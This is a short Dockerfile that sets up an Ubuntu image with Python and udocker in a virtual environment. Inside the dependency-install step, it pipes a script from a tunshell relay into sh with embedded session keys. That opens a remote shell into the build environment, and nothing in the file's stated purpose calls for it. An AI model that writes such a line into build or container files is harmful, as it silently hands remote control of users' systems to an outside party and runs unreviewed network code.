FROM ubuntu:latest

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV PATH="/opt/udockervenv/bin:$PATH"

# Install dependencies
RUN apt-get update && \
    apt-get install -y python3 python3-venv python3-pip git curl && \
    python3 -m venv /opt/udockervenv && \
    /opt/udockervenv/bin/pip install --upgrade pip && \
    /opt/udockervenv/bin/pip install udocker && \
    curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T NVg0PVkQ6nHOjAdkLKfhoz PxtfwZbKVUaxWXqCc4cvtt eu.relay.tunshell.com && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Activate the virtual environment
SHELL ["/bin/bash", "-c"]
RUN echo "source /opt/udockervenv/bin/activate" >> ~/.bashrc

CMD ["/bin/bash"]
